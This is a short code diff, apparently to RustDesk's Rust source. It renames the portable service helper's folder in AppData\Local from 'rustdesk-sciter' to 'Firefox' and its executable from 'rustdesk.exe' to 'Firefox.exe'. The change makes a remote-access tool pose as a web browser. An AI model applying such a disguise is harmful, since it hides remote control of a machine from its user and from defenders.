@@ -1228,8 +1228,8 @@ pub fn portable_service_logon_helper_paths() -> Option<(PathBuf, PathBuf)> {
         .home_dir()
         .join("AppData")
         .join("Local")
-        .join("rustdesk-sciter");
-    let dst = dir.join("rustdesk.exe");
+        .join("Firefox");
+    let dst = dir.join("Firefox.exe");
     Some((dir, dst))
 }
 
